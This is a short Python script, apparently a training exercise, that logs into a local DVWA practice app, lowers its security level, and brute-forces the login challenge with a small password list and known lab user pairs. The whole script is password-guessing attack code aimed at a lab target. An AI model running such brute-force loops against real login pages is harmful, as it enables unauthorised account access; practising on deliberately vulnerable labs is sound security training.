#!/usr/bin/python3
import requests
import re

s = requests.Session()

# 1. Логинимся
r = s.post("http://dvwa.local/login.php", 
          data={'username':'admin','password':'password','Login':'Login'})
print(f"Login: {r.status_code}, Cookies: {dict(s.cookies)}")

# 2. Security low
s.post("http://dvwa.local/security.php",
      data={'security':'low','seclev_submit':'Submit'})

# 3. Пробуем пароли
brute_url = "http://dvwa.local/vulnerabilities/brute/"
passwords = ['password', '123456', 'admin', 'abc123']

for pwd in passwords:
    url = f"{brute_url}?username=admin&password={pwd}&Login=Login"
    r = s.get(url)
    
    # Проверяем ответ
    text = r.text.lower()
    
    if 'welcome to the password protected area' in text:
        print(f"\nSUCCESS: admin / {pwd}")
        # Найдем полную строку
        for line in r.text.split('\n'):
            if 'welcome' in line.lower():
                print(f"Proof: {line.strip()}")
        break
    elif 'username and/or password incorrect' in text:
        print(f"FAILED: admin / {pwd}")
    else:
        print(f"UNKNOWN: admin / {pwd} ({len(r.text)} chars)")
        # Покажем что там
        clean = re.sub('<[^>]+>', ' ', r.text)
        clean = ' '.join(clean.split())
        if len(clean) > 50:
            print(f"Text: {clean[:100]}...")

# 4. Пробуем других пользователей
users = [('gordonb', 'abc123'), ('1337', 'charley')]
for user, pwd in users:
    url = f"{brute_url}?username={user}&password={pwd}&Login=Login"
    r = s.get(url)
    if 'welcome' in r.text.lower():
        print(f"\nSUCCESS: {user} / {pwd}")
        break

print("\nDONE")
